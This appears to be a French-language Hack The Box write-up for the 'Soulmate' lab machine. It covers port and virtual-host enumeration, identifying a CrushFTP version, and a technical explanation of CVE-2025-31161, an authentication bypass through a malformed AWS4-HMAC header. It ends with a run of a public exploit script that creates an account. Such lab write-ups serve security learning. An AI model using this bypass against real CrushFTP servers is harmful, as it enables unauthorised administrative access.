---
tags:
  - writeup/htb
  - ctf
  - web-security
  - authentication-bypass
  - race-condition
  - cve-2025-31161
  - crushftp
---

# Soulmate

## Information Gathering


### Nmap

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-15 18:48 CEST  
Nmap scan report for 10.10.11.86  
Host is up (0.024s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)  
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://soulmate.htb/  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
```

Rien de bien contributif un nginx confirmé sur le site web http://soulmate.htb/ ![[Screenshot_20250915_185213.png]]

### GoBuster

#### Scan de répertoires / fichiers et extensions de fichiers

```bash
[Sep 15, 2025 - 23:20:10 (CEST)] exegol-ctf /workspace # gobuster dir -  
u http://soulmate.htb -w /usr/share/seclists/Discovery/Web-Content/dire  
ctory-list-2.3-big.txt -x php,html,txt,bak,zip -t 50 -o gobuster_dirs.t  
xt  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================
===============================================================
[+] Url:                     http://soulmate.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 16688]
/login.php            (Status: 200) [Size: 8554]
/register.php         (Status: 200) [Size: 11107]
/profile.php          (Status: 302) [Size: 0] [--> /login]
/assets               (Status: 301) [Size: 178] [--> http://soulmate.htb/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/dashboard.php        (Status: 302) [Size: 0] [--> /login]

```

#### Scan vhosts

```bash
[Sep 15, 2025 - 23:17:26 (CEST)] exegol-ctf /workspace # gobuster vhost -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 50 -o gobuster_vhosts.txt


===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://soulmate.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```
On note un vhost ftp.soulmate.htb
#### CrushFTP

Un portail de login crush ftp trouvé sur ```http://ftp.soulmate.htb/WebInterface/login.html```

![[Screenshot_20250915_232830.png]]
```bash
─tximista at zaworudo in /usr/share/SecLists/Discovery/DNS 25-09-15 -  
23:38:35  
╰─○ curl -X GET -vvv http://ftp.soulmate.htb/WebInterface/login.html  
Note: Unnecessary use of -X or --request, GET is already inferred.  
* Host ftp.soulmate.htb:80 was resolved.  
* IPv6: (none)  
* IPv4: 10.10.11.86  
*   Trying 10.10.11.86:80...  
* Connected to ftp.soulmate.htb (10.10.11.86) port 80  
> GET /WebInterface/login.html HTTP/1.1  
> Host: ftp.soulmate.htb  
> User-Agent: curl/8.5.0  
> Accept: */*
 SNIP
 /WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52
SNIP 
```

Version 11 de mars 2025

On recherche une cve

## Foothold

https://github.com/Immersive-Labs-Sec/CVE-2025-31161?tab=readme-ov-file
https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation
## Description technique
La vulnérabilité est un **bypass d’authentification** (« passer outre l’authentification ») : un attaquant distant peut se faire passer pour un utilisateur authentifié — y compris un compte administrateur comme _crushadmin_ — **sans fournir le mot de passe**. 
Le bug est lié au traitement des entêtes **AWS4-HMAC** dans la partie HTTP(S) du serveur _CrushFTP_    
 Il y a une **condition de course** (race condition) : le serveur commence la vérification de l’utilisateur via une fonction `login_user_pass()` _sans exiger de mot de passe_, ce qui peut temporairement authentifier la session tant que les vérifications suivantes ne sont pas encore faites. 
 On peut stabiliser ce contournement en envoyant un en-tête AWS4-HMAC _mangé_ — par exemple en fournissant **seulement le nom d’utilisateur suivi d’un slash** `/`, sans d’autres parties attendues (SignedHeaders, etc.). Ce format provoque une erreur du type _index-out-of-bounds_ qui empêche le code d’atteindre la phase de nettoyage de session. Le résultat : la session reste authentifiée en tant qu’utilisateur choisi. 
    

---

Utilisation de la cve qui permet
```bash
╭─tximista at zaworudo in ~/Bidouille/Opz/soulmate 25-09-17 - 22:33:42  
╰─○ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80    
[+] Preparing Payloads  
 [-] Warming up the target  
 [-] Target is up and running  
[+] Sending Account Create Request  
 [!] User created successfully  
[+] Exploit Complete you can now login with  
  [*] Username: AuthBypassAccount  
  [*] Password: CorrectHorseBatteryStaple.
  
``` 